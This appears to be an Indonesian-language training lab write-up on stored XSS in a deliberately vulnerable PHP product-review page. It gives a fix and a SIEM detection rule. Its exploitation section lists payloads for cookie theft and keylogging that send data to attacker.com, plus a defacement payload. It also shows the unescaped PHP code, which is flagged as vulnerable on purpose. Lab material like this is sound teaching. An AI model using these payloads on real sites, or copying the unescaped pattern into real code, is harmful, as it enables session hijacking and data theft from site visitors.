# XSS (Cross-Site Scripting) — Stored

## Deskripsi
Stored XSS terjadi ketika input pengguna disimpan ke database tanpa sanitasi, lalu ditampilkan kembali tanpa escaping. Attacker bisa menyisipkan script berbahaya yang akan dieksekusi oleh browser setiap pengunjung halaman.

## Endpoint Vulnerable
- **URL:** `/public/product.php?id={ID}` — bagian review/komentar
- **Method:** POST
- **Parameter:** `comment`

## Cara Eksploitasi

### 1. Basic Alert
```
<script>alert('XSS by nhsec')</script>
```

### 2. Cookie Stealing
```
<script>fetch('http://attacker.com/steal?c='+document.cookie)</script>
```

### 3. DOM Manipulation
```
<img src=x onerror="document.body.innerHTML='<h1>Hacked by nhsec</h1>'">
```

### 4. Keylogger
```
<script>document.onkeypress=function(e){fetch('http://attacker.com/log?k='+e.key)}</script>
```

## Lokasi di Kode

### Input (tidak disanitasi)
File: `app/public/product.php`
```php
$comment = $_POST['comment'] ?? '';  // [VULN: XSS] - no sanitization intentional
$stmt = $conn->prepare("INSERT INTO reviews ... VALUES (?, ?, ?, ?)");
```

### Output (tidak di-escape)
File: `app/public/product.php`
```php
<?= $review['comment'] ?>  // [VULN: XSS] - NOT escaped intentional
```

## Cara Fix
```php
// Input: sanitize
$comment = htmlspecialchars($_POST['comment'], ENT_QUOTES, 'UTF-8');

// Output: escape
<?= htmlspecialchars($review['comment'], ENT_QUOTES, 'UTF-8') ?>
```

## SIEM Detection
Rule `XSS` mendeteksi pattern `<script>`, `onerror=`, `onload=`, `javascript:` di parameter request.
